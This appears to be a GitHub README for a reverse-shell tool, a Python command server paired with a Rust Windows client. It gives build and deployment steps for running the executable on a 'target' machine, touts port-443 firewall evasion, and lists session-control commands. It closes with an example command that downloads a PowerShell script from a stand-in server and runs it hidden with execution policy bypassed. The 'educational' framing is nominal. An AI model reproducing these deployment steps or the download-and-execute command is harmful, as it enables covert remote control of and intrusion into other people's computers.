# 🐍 Reverse Shell (Python Server & Rust Client)

This project is a simple yet effective reverse shell, consisting of a Python server for managing connections and a Rust-based client for the Windows operating system. This tool is designed for **educational purposes and penetration testing**.

## 📋 Features

- ✅ **Python Server:** Lightweight and runnable on Linux-based operating systems.
- 🔐 **Encrypted Communication:** Utilizes the `pycryptodome` library for data encryption.
- 🖥️ **Rust Client:** Compiles to a small, fast `.exe` executable for Windows.
- 📡 **Session Management:** Capable of handling multiple concurrent connections.
- 🛡️ **Firewall Bypass:** Uses port 443 to reduce the likelihood of traffic being blocked.

---

## 🚩 Prerequisites

### For the Server (Ubuntu Server)

- An Ubuntu server or virtual machine with a **static IP address**.
- Python 3 installed.
- `pip` (Python's package installer) installed.

### For Compiling the Client (Windows)

- The **Rust** programming language installed. (You can download it from [here](https://www.rust-lang.org/tools/install))
- **Microsoft Visual Studio Build Tools** with **C++** support installed. (You can download it from [here](https://visualstudio.microsoft.com/visual-cpp-build-tools/))

---

## 🛠 Server Installation & Setup

Follow these steps on your Ubuntu server:

1.  First, update your system and install `pip`:
    ```bash
    sudo apt update
    sudo apt install python3-pip
    ```

2.  Open the desired port (443 in this example) in your firewall:
    ```bash
    sudo ufw allow 443
    ```

3.  Clone the project from GitHub and navigate into its directory.

4.  Install the required Python libraries. (Ensure a `requirements.txt` file exists in the project and includes `pycryptodome`.)
    ```bash
    pip install -r requirements.txt
    ```

5.  Run the server:
    ```bash
    python3 server.py
    ```
    or
    ```bash
    python server.py
    ```

At this point, the server is active and will listen for incoming client connections. You can type `help` at any time in the server terminal to see the list of available commands.

---

## 🔨 Building the Client Executable (Exe)

To build the `.exe` file that will run on the target Windows system, follow these steps:

1.  Ensure you have installed the prerequisites for **Rust** and **Visual Studio Build Tools**.

2.  Navigate to the client directory in the project:
    ```bash
    cd reverse_shell
    ```

3.  Open the `main.rs` file with a text editor.

4.  Find the following line and replace it with your Linux server's IP address and port. (Using port 443 is recommended)
    ```rust
    let server_addr = "YOUR_SERVER_IP:443"; // <-- Replace with your server's IP
    ```

5.  Run the following command to compile the project:
    ```bash
    cargo build --release --target x86_64-pc-windows-msvc
    ```

6.  The executable `.exe` file will be created at the following path:
    ```
    target\x86_64-pc-windows-msvc\release\reverse_shell.exe
    ```

> **⚠️ Important Warning:** Never run the `reverse_shell.exe` file on your own machine! This file is designed to be executed on the target system. For testing, always use a virtual machine.

---

## 📖 How to Use

1.  Run the server on your Ubuntu VM as described in the setup instructions.
2.  Transfer the compiled `reverse_shell.exe` file to the target Windows machine.
3.  Execute the `reverse_shell.exe` file on the target system.
4.  Immediately after execution, a new connection will appear in your server's terminal.

---

## 🎯 Commands

### Server Commands (For Managing Connections)

Enter these commands in the Python server terminal:

- `help`: Displays the list of available commands.
- `sessions`: Shows all active sessions (connections).
- `connect <id>`: Connects to a specific session to send commands. (e.g., `connect 1`)
- `info <id>`: Retrieves basic system information for a specific session.
- `exit`: Shuts down the server completely.

### Example Client-Side Commands (To Run on the Target)

After connecting to a session using the `connect` command, you can send the following commands to perform various actions on the target system:

#### Download and Execute a PowerShell Script
```cmd
curl -o "script.ps1" "http://your-server.com/script.ps1" 
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "script.ps1"
